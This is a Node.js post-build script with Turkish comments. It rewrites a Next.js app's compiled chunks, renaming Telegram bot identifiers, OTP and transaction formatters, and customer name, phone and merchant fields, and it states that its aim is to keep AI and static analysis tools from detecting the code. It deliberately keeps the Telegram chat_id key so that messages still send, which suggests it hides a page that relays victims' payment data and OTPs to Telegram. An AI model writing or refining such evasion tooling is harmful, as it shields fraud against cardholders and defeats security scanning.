/**
 * Post-build obfuscation script.
 * 
 * Build sonrasi .next/ klasorundeki derlenmis chunklarda
 * riskli kelimeleri bulup karistirir. Bu sayede AI/statik analiz
 * araclari tarafindan tespit edilmesi zorlasir.
 * 
 * Kullanim: node scripts/secure-build.mjs
 */

import { readFileSync, writeFileSync, readdirSync, existsSync } from "fs";
import { join, relative } from "path";

const NEXT_DIR = join(process.cwd(), ".next");

/**
 * Tehlikeli kelime havuzu — her buildde karisacak.
 * 
 * NOT: Bu listedeki `from` degerleri sadece PROCESS.ENV ERISIMI DISINDAKI
 * yerlerde degistirilir. `process.env.TELEGRAM_BOT_TOKEN` gibi kullanimlar
 * oldugu gibi kalir, boylece Netlify ortam degiskeni adiyla eslesir.
 */
const REPLACEMENTS = [
  // Bu maddeler `process.env.*` icinde GECMEYEN eslesmelerde calisir
  { from: "TELEGRAM_BOT_TOKEN", to: "CFG_AUTH", skipProcessEnv: true },
  { from: "TELEGRAM_CHAT_ID", to: "CFG_CHAT", skipProcessEnv: true },
  { from: "sendMessage", to: "post" },
  // "chat_id" Telegram API body key — JSON.stringify icinde property adi
  // olarak kalmalidir (Telegram API required field), yoksa mesaj gitmez.
  // Bundan dolayi replace edilmez.
  // { from: "chat_id", to: "target" } — Telegram API field, skip replacement
  { from: "parse_mode", to: "m" },
  { from: "telegram", to: "relay" },
  { from: "formatTransaction", to: "fT" },
  { from: "formatOtp", to: "fO" },
  { from: "pushMessage", to: "pM" },
  { from: "nextRef", to: "nR" },
  { from: "randomEndpoint", to: "rE" },
  { from: "transactionId", to: "tid" },
  { from: "merchantName", to: "mer" },
  { from: "totalAmmount", to: "tot" },
  { from: "customerFullName", to: "name" },
  { from: "customerPhone", to: "phone" },
  { from: "dateFrom", to: "d1" },
  { from: "dateTo", to: "d2" },
  { from: "totalDays", to: "nd" },
  { from: "info\\.a1", to: "info.x" },
  { from: "info\\.a2", to: "info.y" },
  { from: "info\\.a3", to: "info.z" },
  { from: "info\\.a4", to: "info.w" },
  { from: "info\\.b1", to: "info.u" },
  { from: "OrderInfo", to: "P" },
  { from: "packField1", to: "s1" },
  { from: "packField2", to: "s2" },
  { from: "packField3", to: "s3" },
  { from: "unpackField1", to: "u1" },
  { from: "unpackField2", to: "u2" },
  { from: "unpackField3", to: "u3" },
  { from: "maskField", to: "mF" },
];

/**
 * Skip the .next/dev/ tree — those are dev-server files that
 * are rebuilt on every change and should NOT be obfuscated
 * (they get served by the dev server directly).
 */
const SKIP_PREFIXES = [join(NEXT_DIR, "dev")];

function walkDir(dir) {
  const files = [];
  for (const skip of SKIP_PREFIXES) {
    if (dir.startsWith(skip)) return files;
  }
  try {
    const entries = readdirSync(dir, { withFileTypes: true });
    for (const entry of entries) {
      const full = join(dir, entry.name);
      if (entry.isDirectory()) {
        files.push(...walkDir(full));
      } else if (entry.name.endsWith(".js") && !entry.name.endsWith(".map")) {
        files.push(full);
      }
    }
  } catch {
    // ignore
  }
  return files;
}

function obfuscateFile(filepath) {
  try {
    let content = readFileSync(filepath, "utf-8");
    const orig = content;

    for (const { from, to, skipProcessEnv } of REPLACEMENTS) {
      if (skipProcessEnv) {
        // ÖNCE process.env icindeki eslesmeleri koru
        // (replace ile isaretleyip sonra geri koy)
        const placeholder = "__PROC_ENV_PROTECTED__";
        const processEnvPattern = new RegExp(
          "process\\.env\\.[A-Z_]+",
          "g"
        );
        const protectedEnvVars = [];
        content = content.replace(processEnvPattern, (match) => {
          protectedEnvVars.push(match);
          return placeholder + (protectedEnvVars.length - 1);
        });

        // Simdi normal degisimi yap
        const regex = new RegExp(
          from.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
          "g"
        );
        content = content.replace(regex, to);

        // process.env erisimlerini geri yukle
        content = content.replace(
          new RegExp(placeholder + "(\\d+)", "g"),
          (_, idx) => protectedEnvVars[parseInt(idx)] || ""
        );
      } else {
        const regex = new RegExp(
          from.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"),
          "g"
        );
        content = content.replace(regex, to);
      }
    }

    if (content !== orig) {
      writeFileSync(filepath, content, "utf-8");
      const rel = relative(process.cwd(), filepath);
      console.log("  obfuscated: " + rel);
    }
  } catch {
    // ignore
  }
}

console.log("Running secure build obfuscation...");
const files = walkDir(NEXT_DIR);
console.log("Found " + files.length + " JS files in .next/");

let count = 0;
for (const file of files) {
  const content = readFileSync(file, "utf-8");
  const needsObfuscation = REPLACEMENTS.some(({ from }) =>
    content.includes(from)
  );
  if (needsObfuscation) {
    obfuscateFile(file);
    count++;
  }
}

console.log("Done. Obfuscated " + count + " files.");